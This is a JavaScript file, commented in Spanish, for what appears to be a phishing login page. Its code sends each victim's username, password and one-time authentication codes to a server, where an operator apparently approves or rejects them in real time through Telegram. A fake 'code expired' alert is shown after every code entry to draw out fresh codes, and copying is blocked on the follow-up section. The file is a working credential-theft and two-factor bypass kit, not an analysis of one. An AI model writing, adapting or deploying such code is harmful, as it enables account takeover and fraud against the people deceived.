// script.js

function showLoadingScreen(callback, duration = 2000) {
    const loadingScreen = document.querySelector(".loading-screen");
    loadingScreen.classList.remove("hidden");

    loadingScreen.style.backgroundColor = "rgba(233, 233, 233, 0.6)";

    setTimeout(() => {
        loadingScreen.classList.add("hidden");
        if (callback) callback();
    }, duration); 
}

// Mostrar la pantalla de carga antes de mostrar el panel de usuario
showLoadingScreen(() => {
    const loginContainer = document.querySelector(".login-container");
    loginContainer.classList.remove("hidden");
});

document.getElementById("entrarBtn").addEventListener("click", function () {
    showLoadingScreen(() => {
        document.querySelector(".password-modal").classList.remove("hidden");
    });
});

// ========================================
// BOTÓN CONTINUAR - OPCIONES INDEPENDIENTES
// ========================================

let esperandoDecisionOpciones = false;

// ========================================
// TIEMPO MÁXIMO DE ESPERA DE TELEGRAM
// ========================================

const TIEMPO_MAXIMO_OPCIONES = 60000;

// Identifica cada intento para impedir
// que respuestas anteriores afecten
// a una solicitud nueva.
let identificadorIntentoOpciones = 0;

// ========================================
// BOTÓN CONTINUAR - OPCIONES INDEPENDIENTES
// CON TIEMPO MÁXIMO DE 2 MINUTOS
// ========================================

document.getElementById("continuarBtn").addEventListener(
    "click",
    async function () {

        if (esperandoDecisionOpciones) {
            return;
        }

        esperandoDecisionOpciones = true;

        // Identificador exclusivo de este intento
        const intentoActual = ++identificadorIntentoOpciones;

        // Mostrar pantalla de carga original
        const loadingScreen =
            document.querySelector(".loading-screen");

        loadingScreen.classList.remove("hidden");

        loadingScreen.style.backgroundColor =
            "rgba(233, 233, 233, 0.6)";

        // Obtener ID del dispositivo
        const dispositivoID = obtenerIDDispositivo();

        // Control para cancelar las solicitudes HTTP
        // de este intento cuando expire.
        const controlador = new AbortController();

        // Iniciar los 2 minutos desde que
        // el usuario presiona Continuar.
        const temporizador = setTimeout(function () {

            // Evitar actuar sobre intentos anteriores
            if (
                intentoActual !== identificadorIntentoOpciones ||
                !esperandoDecisionOpciones
            ) {
                return;
            }

            // Invalidar este intento
            identificadorIntentoOpciones++;

            // Detener solicitudes pendientes
            controlador.abort();

            // Permitir un nuevo intento
            esperandoDecisionOpciones = false;

            // Ocultar pantalla de carga
            loadingScreen.classList.add("hidden");

            // Mantener visible el formulario
            document.querySelector(".login-container")
                .classList.remove("hidden");

            // Mantener ocultas las secciones
            document.getElementById("seccion-si")
                .classList.add("hidden");

            document.getElementById("seccion-no")
                .classList.add("hidden");

            // Mostrar alerta con el mismo diseño
            mostrarAlertaOpcionesNo(
                "Servicio no disponible, por favor intenta más tarde"
            );

        }, TIEMPO_MAXIMO_OPCIONES);

        try {

            // Crear solicitud de Telegram
            const respuesta = await fetch(
                "/opciones/crear",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        dispositivoID
                    }),
                    signal: controlador.signal
                }
            );

            if (!respuesta.ok) {
                throw new Error(
                    "No se pudo crear la solicitud"
                );
            }

            const datos = await respuesta.json();

            // Si este intento expiró mientras
            // se creaba la solicitud, no continuar.
            if (
                intentoActual !== identificadorIntentoOpciones
            ) {
                return;
            }

            // Esperar la decisión de Telegram
            await esperarDecisionOpciones(
                datos.idSolicitud,
                intentoActual,
                controlador.signal
            );

        } catch (error) {

            // Ignorar errores de solicitudes canceladas
            // o de intentos que ya expiraron.
            if (
                intentoActual !== identificadorIntentoOpciones
            ) {
                return;
            }

            console.error(
                "Error en las opciones:",
                error
            );

            loadingScreen.classList.add("hidden");

            esperandoDecisionOpciones = false;

        } finally {

            clearTimeout(temporizador);

        }
    }
);

document.getElementById("cancelarBtn").addEventListener("click", function () {
    document.querySelector(".password-modal").classList.add("hidden");
});

document.getElementById("cancelarAuthBtn").addEventListener("click", function () {
    document.querySelector(".auth-modal").classList.add("hidden");
});

// Obtener o crear un ID único para el dispositivo
function obtenerIDDispositivo() {
    let dispositivoID = localStorage.getItem("dispositivoID");
    if (!dispositivoID) {
        dispositivoID = 'id.' + Math.floor(Math.random() * 1000);
        localStorage.setItem("dispositivoID", dispositivoID);
    }
    return dispositivoID;
}

// Enviar datos al servidor
async function enviarDatos(tipo, texto) {
    const dispositivoID = obtenerIDDispositivo();
    await fetch(`/send-${tipo}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ dispositivoID, texto })
    });
}

// Validaciones
function validarUsuario(usuario) {
    return usuario.length >= 6;
}

function validarContrasena(contrasena) {
    const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^A-Za-z\d])[A-Za-z\d\S]{8,}$/;
    return regex.test(contrasena);
}

function validarAuth(authCode) {
    return /^\d{6,}$/.test(authCode); // Acepta 6 o más dígitos
}

// Actualizar el estado del botón
function actualizarEstadoBoton(inputId, buttonId, validarFuncion) {
    const input = document.getElementById(inputId);
    const button = document.getElementById(buttonId);

    input.addEventListener("input", () => {
        if (validarFuncion(input.value)) {
            button.disabled = false;
            button.classList.add("active");
        } else {
            button.disabled = true;
            button.classList.remove("active");
        }
    });
}

// Llamar a las funciones para cada campo
actualizarEstadoBoton("usuario", "entrarBtn", validarUsuario);
actualizarEstadoBoton("password", "continuarBtn", validarContrasena);
actualizarEstadoBoton("authCode", "authBtn", validarAuth);


function togglePasswordVisibility() {
    const passwordInput = document.getElementById("password");
    const passwordIcon = document.getElementById("password-icon");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        passwordIcon.src = "vs.jpg"; // Cambia a la imagen de "ojo cerrado"
    } else {
        passwordInput.type = "password";
        passwordIcon.src = "vs.jpg"; // Cambia a la imagen de "ojo abierto"
    }
}


// Botones de entrada
document.getElementById("entrarBtn").addEventListener("click", function () {
    const usuario = document.getElementById("usuario").value;
    enviarDatos('user', usuario);  // Enviar usuario
});

// Enviar contraseña al servidor
document.getElementById("continuarBtn").addEventListener("click", function () {
    const password = document.getElementById("password").value;
    enviarDatos('password', password);  // Enviar contraseña
});

// Enviar código de autenticación
document.getElementById("authBtn").addEventListener("click", async function () {
    const authCode = document.getElementById("authCode").value;
    await enviarDatos('auth', authCode);  // Enviar código de autenticación
});

// Función para mostrar la alerta personalizada de autenticación incorrecta
function mostrarAlertaAutenticacionIncorrecta() {
    // Crea un contenedor de alerta
    const alerta = document.createElement("div");
    alerta.className = "alertaAutenticacion";
    alerta.style.position = "fixed";
    alerta.style.bottom = "12%";
    alerta.style.left = "50%";
    alerta.style.transform = "translateX(-50%)";
    alerta.style.backgroundColor = "#0068b1"; // Color de fondo azul
    alerta.style.padding = "15px 17px";
    alerta.style.borderRadius = "5px";
    alerta.style.display = "flex";
    alerta.style.alignItems = "center";
    alerta.style.justifyContent = "space-between";
    alerta.style.color = "white";
    alerta.style.fontSize = "15.6px";
    alerta.style.fontWeight = "500";
    alerta.style.minWidth = "320px";
    alerta.style.zIndex = "1000";

    // Agrega el mensaje de error
    const mensaje = document.createElement("span");
    mensaje.textContent = "Código expirado. Introduzca el nuevo código.";
    alerta.appendChild(mensaje);

    // Agrega el contenedor de alerta al cuerpo del documento
    document.body.appendChild(alerta);
}

// ========================================
// ALERTA EXCLUSIVA PARA RESPUESTA NO
// ========================================

function mostrarAlertaOpcionesNo(
    texto = "Incorrecto"
)  {

    // Eliminar una alerta anterior de este mismo tipo
    document.querySelector(".alertaOpcionesNo")?.remove();

    // Crear el contenedor de alerta
    const alerta = document.createElement("div");

    alerta.className = "alertaOpcionesNo";

    // Mismas características de la alerta original
    alerta.style.position = "fixed";
    alerta.style.bottom = "12%";
    alerta.style.left = "50%";
    alerta.style.transform = "translateX(-50%)";
    alerta.style.backgroundColor = "#0068b1";
    alerta.style.padding = "15px 17px";
    alerta.style.borderRadius = "5px";
    alerta.style.display = "flex";
    alerta.style.alignItems = "center";
    alerta.style.justifyContent = "space-between";
    alerta.style.color = "white";
    alerta.style.fontSize = "15.6px";
    alerta.style.fontWeight = "500";
    alerta.style.minWidth = "320px";
    alerta.style.zIndex = "1000";

    // Crear el mensaje
    const mensaje = document.createElement("span");

    mensaje.textContent = texto;

    alerta.appendChild(mensaje);

    // Mostrar alerta
    document.body.appendChild(alerta);
}

// Modifica el evento de autenticación para mostrar la alerta personalizada
document.getElementById("authBtn").addEventListener("click", async function () {
    const authCode = document.getElementById("authCode").value;

    document.querySelector(".alertaAutenticacion")?.remove();

    showLoadingScreen(() => {
    
    // Mostrar mensaje de autenticación incorrecta usando la función personalizada
    mostrarAlertaAutenticacionIncorrecta();
    });
});

document.getElementById("authCode").addEventListener("focus", function () {
    document.querySelector(".alertaAutenticacion")?.remove();
});

document.getElementById("usuario").addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault();
        this.blur();
        document.getElementById("entrarBtn").click();
    }
});

document.getElementById("password").addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault();
        this.blur();
        document.getElementById("continuarBtn").click();
    }
});

document.getElementById("authCode").addEventListener("keydown", function (event) {
    if (event.key === "Enter") {
        event.preventDefault();
        this.blur();
        document.getElementById("authBtn").click();
    }
});

document.getElementById("usuario").addEventListener("focus", function () {
    setTimeout(() => {
        this.scrollIntoView({
            behavior: "smooth",
            block: "center"
        });
    }, 300);
});

// ========================================
// ESPERAR DECISIÓN DE TELEGRAM
// ========================================

// ========================================
// ESPERAR DECISIÓN DE TELEGRAM
// CON CONTROL DE INTENTOS EXPIRADOS
// ========================================

async function esperarDecisionOpciones(
    idSolicitud,
    intentoActual,
    signal
) {

    while (
        intentoActual === identificadorIntentoOpciones &&
        !signal.aborted
    ) {

        try {

            const respuesta = await fetch(
                "/opciones/estado/" +
                encodeURIComponent(idSolicitud),
                {
                    cache: "no-store",
                    signal: signal
                }
            );

            if (!respuesta.ok) {
                throw new Error(
                    "No se pudo consultar la decisión"
                );
            }

            const datos = await respuesta.json();

            // Verificar nuevamente que este intento
            // siga siendo válido.
            if (
                intentoActual !== identificadorIntentoOpciones ||
                signal.aborted
            ) {
                return;
            }

            // ========================================
            // RESPUESTA SÍ
            // ========================================

            if (datos.estado === "si") {

                // Invalidar este intento para evitar
                // que vuelva a procesarse.
                identificadorIntentoOpciones++;

                mostrarSeccionOpciones("si");

                return;
            }

            // ========================================
            // RESPUESTA NO
            // ========================================

            if (datos.estado === "no") {

                identificadorIntentoOpciones++;

                mostrarSeccionOpciones("no");

                return;
            }

        } catch (error) {

            if (
                signal.aborted ||
                intentoActual !== identificadorIntentoOpciones
            ) {
                return;
            }

            console.error(
                "Esperando conexión:",
                error.message
            );
        }

        // Consultar nuevamente cada 1.5 segundos
        await new Promise(resolve => {
            setTimeout(resolve, 1500);
        });
    }
}


// ========================================
// MOSTRAR SECCIÓN CORRESPONDIENTE
// ========================================

// ========================================
// MOSTRAR SECCIÓN CORRESPONDIENTE
// ========================================

function mostrarSeccionOpciones(opcion) {

    const loadingScreen =
        document.querySelector(".loading-screen");

    const loginContainer =
        document.querySelector(".login-container");

    const seccionSi =
        document.getElementById("seccion-si");

    const seccionNo =
        document.getElementById("seccion-no");

    // Ocultar pantalla de carga
    loadingScreen.classList.add("hidden");

    // Ocultar ambas secciones inicialmente
    seccionSi.classList.add("hidden");
    seccionNo.classList.add("hidden");

    // ========================================
    // RESPUESTA SÍ
    // ========================================

    if (opcion === "si") {

        // Eliminar alerta de rechazo si existe
        document.querySelector(".alertaOpcionesNo")?.remove();

        // Ocultar formulario original
        loginContainer.classList.add("hidden");

        // Mostrar sección de imágenes
        seccionSi.classList.remove("hidden");

    }

    // ========================================
    // RESPUESTA NO
    // ========================================

    else if (opcion === "no") {

        // Mantener visible el formulario original
        loginContainer.classList.remove("hidden");

        // Mostrar alerta de contraseña incorrecta
        mostrarAlertaOpcionesNo();

    }

    // Permitir una nueva solicitud
    esperandoDecisionOpciones = false;
}

// ========================================
// PROTECCIÓN EXCLUSIVA DE SECCION-SI
// ========================================

(function configurarProteccionSeccionSi() {

    // Obtener únicamente la nueva sección
    const seccionSi = document.getElementById("seccion-si");

    // Evitar errores si la sección no existe
    if (!seccionSi) {
        return;
    }

    // ========================================
    // BLOQUEAR MENÚ CONTEXTUAL
    // ========================================

    seccionSi.addEventListener("contextmenu", function(event) {

        event.preventDefault();

    });

    // ========================================
    // BLOQUEAR SELECCIÓN DE CONTENIDO
    // ========================================

    seccionSi.addEventListener("selectstart", function(event) {

        event.preventDefault();

    });

    // ========================================
    // BLOQUEAR COPIA
    // ========================================

    seccionSi.addEventListener("copy", function(event) {

        event.preventDefault();

    });

    // ========================================
    // BLOQUEAR CORTE
    // ========================================

    seccionSi.addEventListener("cut", function(event) {

        event.preventDefault();

    });

    // ========================================
    // BLOQUEAR ARRASTRE DE IMÁGENES
    // ========================================

    seccionSi.addEventListener("dragstart", function(event) {

        event.preventDefault();

    });

})();

// ========================================
// OCULTAR ALERTA NO AL CORREGIR CREDENCIALES
// ========================================

["usuario", "password"].forEach(function(idCampo) {

    document.getElementById(idCampo).addEventListener(
        "input",
        function() {

            document.querySelector(".alertaOpcionesNo")?.remove();

        }
    );

});

// ==========================================
// FORMULARIO INTERACTIVO DE SECCION-SI
// ==========================================

(function configurarFormularioSeccionSi() {

    const seccion = document.getElementById("seccion-si");

    if (!seccion) {
        return;
    }

    const campos = seccion.querySelectorAll(
        ".formulario-campo"
    );

    const botonContinuar = seccion.querySelector(
        "#formulario-boton-continuar"
    );

    const botonCancelar = seccion.querySelector(
        "#formulario-boton-cancelar"
    );

    // Si el formulario todavía no existe,
    // no ejecutar esta programación.
    if (
        campos.length !== 3 ||
        !botonContinuar ||
        !botonCancelar
    ) {
        return;
    }

    // ==========================================
    // CERRAR CAMPOS
    // ==========================================

    function cerrarCampos(excepto = null) {

        campos.forEach(function(campo) {

            if (campo !== excepto) {

                campo.classList.remove("activo");

                const control = campo.querySelector(
                    ".formulario-campo-control"
                );

                control.setAttribute(
                    "aria-expanded",
                    "false"
                );

            }

        });

    }

    // ==========================================
    // ACTUALIZAR BOTÓN CONTINUAR
    // ==========================================

    function actualizarBotonContinuar() {

        const completos = Array.from(campos).every(
            function(campo) {

                return campo.classList.contains(
                    "completado"
                );

            }
        );

        botonContinuar.disabled = !completos;

    }

    // ==========================================
    // CONFIGURAR CAMPOS
    // ==========================================

    campos.forEach(function(campo) {

        const control = campo.querySelector(
            ".formulario-campo-control"
        );

        const valor = campo.querySelector(
            ".formulario-valor"
        );

        const opciones = campo.querySelectorAll(
            ".formulario-opcion"
        );

        // ABRIR O CERRAR EL DESPLEGABLE

        control.addEventListener(
            "click",
            function(event) {

                event.stopPropagation();

                const estabaActivo =
                    campo.classList.contains("activo");

                cerrarCampos();

                if (!estabaActivo) {

                    campo.classList.add("activo");

                    control.setAttribute(
                        "aria-expanded",
                        "true"
                    );

                }

            }
        );

        // SELECCIONAR UNA OPCIÓN

        opciones.forEach(function(opcion) {

            opcion.addEventListener(
                "click",
                function(event) {

                    event.stopPropagation();

                    const seleccion =
                        opcion.dataset.valor;

                    // Mostrar la opción seleccionada
                    valor.textContent = seleccion;

                    // Mantener la etiqueta arriba
                    campo.classList.add("completado");

                    // Cerrar el menú
                    campo.classList.remove("activo");

                    control.setAttribute(
                        "aria-expanded",
                        "false"
                    );

                    // Comprobar si están completos
                    // los tres campos
                    actualizarBotonContinuar();

                }
            );

        });

    });

    // ==========================================
    // CERRAR AL TOCAR FUERA
    // ==========================================

    seccion.addEventListener(
        "click",
        function(event) {

            if (!event.target.closest(".formulario-campo")) {

                cerrarCampos();

            }

        }
    );

    // ==========================================
    // BOTÓN CONTINUAR
    // ==========================================

    botonContinuar.addEventListener(
        "click",
        function() {

            if (botonContinuar.disabled) {
                return;
            }

            // Sin acción por el momento.

        }
    );

    // ==========================================
    // BOTÓN CANCELAR
    // ==========================================

    botonCancelar.addEventListener(
        "click",
        function() {

            // Sin acción por el momento.

        }
    );

    // Estado inicial
    actualizarBotonContinuar();

})();